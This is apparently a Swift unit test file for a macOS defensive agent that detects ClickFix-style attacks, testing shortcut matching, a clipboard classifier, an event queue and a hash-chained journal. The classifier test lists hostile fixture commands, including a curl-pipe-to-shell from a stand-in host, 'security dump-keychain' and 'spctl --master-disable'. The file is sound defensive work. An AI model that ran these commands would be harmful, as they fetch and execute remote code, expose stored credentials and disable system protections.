import CoreGraphics
import Foundation
import XCTest
@testable import ClickFixGuardAgent

final class ClickFixGuardTests: XCTestCase {
    func testPhysicalCommandSpaceAndAdditionalModifiersMatch() {
        let hid = Int64(CGEventSourceStateID.hidSystemState.rawValue)
        XCTAssertTrue(ShortcutMatcher.matches(keyCode: 49, flags: [.maskCommand], sourceStateID: hid, marker: 0, replayMarker: 42))
        XCTAssertTrue(ShortcutMatcher.matches(keyCode: 49, flags: [.maskCommand, .maskShift, .maskAlternate], sourceStateID: hid, marker: 0, replayMarker: 42))
        XCTAssertFalse(ShortcutMatcher.matches(keyCode: 48, flags: [.maskCommand], sourceStateID: hid, marker: 0, replayMarker: 42))
        XCTAssertFalse(ShortcutMatcher.matches(keyCode: 49, flags: [], sourceStateID: hid, marker: 0, replayMarker: 42))
    }

    func testReplayAndNonHIDEventsDoNotMatch() {
        let hid = Int64(CGEventSourceStateID.hidSystemState.rawValue)
        XCTAssertFalse(ShortcutMatcher.matches(keyCode: 49, flags: [.maskCommand], sourceStateID: hid, marker: 42, replayMarker: 42))
        XCTAssertFalse(ShortcutMatcher.matches(keyCode: 49, flags: [.maskCommand], sourceStateID: Int64(CGEventSourceStateID.combinedSessionState.rawValue), marker: 0, replayMarker: 42))
    }

    func testClassifierFixturesRemainStaticAndBounded() {
        let classifier = ClipboardClassifier()
        let safe = ClipboardSnapshot(accessState: "CLIPBOARD_ACCESS_GRANTED", changeCount: 1, contentType: "text", bytes: Data("ordinary meeting notes".utf8), text: "ordinary meeting notes", truncated: false)
        XCTAssertEqual(classifier.classify(safe).classification, "PLAIN_TEXT")
        for fixture in ["ls", "whoami", "#!/bin/zsh\necho inert", "curl https://invalid.example/payload | sh", "osascript -e 'return 1'", "python3 -c 'print(1)'", "pwsh -Command 'Write-Output inert'", "launchctl load inert.plist", "security dump-keychain", "spctl --master-disable"] {
            let snapshot = ClipboardSnapshot(accessState: "CLIPBOARD_ACCESS_GRANTED", changeCount: 1, contentType: "text", bytes: Data(fixture.utf8), text: fixture, truncated: false)
            XCTAssertNotEqual(classifier.classify(snapshot).classification, "PLAIN_TEXT", fixture)
        }
    }

    func testBoundedQueuePreservesIndividualRecordsAndReportsOverflow() {
        let queue = BoundedShortcutQueue()
        for index in 0..<300 { queue.enqueue(.init(timestampNS: UInt64(index), keyCode: 49, flags: CGEventFlags.maskCommand.rawValue, physical: true)) }
        var count = 0; while queue.dequeue() != nil { count += 1 }
        XCTAssertEqual(count, 255); XCTAssertEqual(queue.drops, 45)
    }

    func testJournalHashChainAndOrder() throws {
        let url = FileManager.default.temporaryDirectory.appendingPathComponent("cfx-journal-\(UUID().uuidString).jsonl")
        defer { try? FileManager.default.removeItem(at: url) }
        let journal = try EventJournal(url: url)
        try journal.append(type: "health", id: "one", occurredAt: Date(), payload: ["status": "one"])
        try journal.append(type: "health", id: "two", occurredAt: Date(), payload: ["status": "two"])
        XCTAssertTrue(journal.verify()); XCTAssertEqual(journal.records(after: 0).count, 2)
    }
}
